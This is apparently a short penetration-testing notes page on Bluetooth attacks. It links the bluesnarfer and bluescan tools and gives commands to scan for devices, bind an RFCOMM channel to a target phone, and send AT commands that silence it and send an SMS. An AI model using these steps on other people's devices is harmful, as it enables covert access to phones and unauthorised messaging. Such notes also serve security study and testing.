# 🫐 Bluetooth

{% embed url="https://github.com/kimbo/bluesnarfer" %}

```bash
# scan peripherals
service bluetooth start
hcitool scan
# or
bluetoothctl scan on

# connect
rfcomm bind 0 $mac $channel_nb
rfcomm bind 0 $mac 6
# connect to the peripheral on channel 6

# AT terminal 
AT*ESIL=1 # activates silence mode
AT+CMGS="+336875648" # sends SMS

```

{% embed url="https://github.com/fO-000/bluescan" %}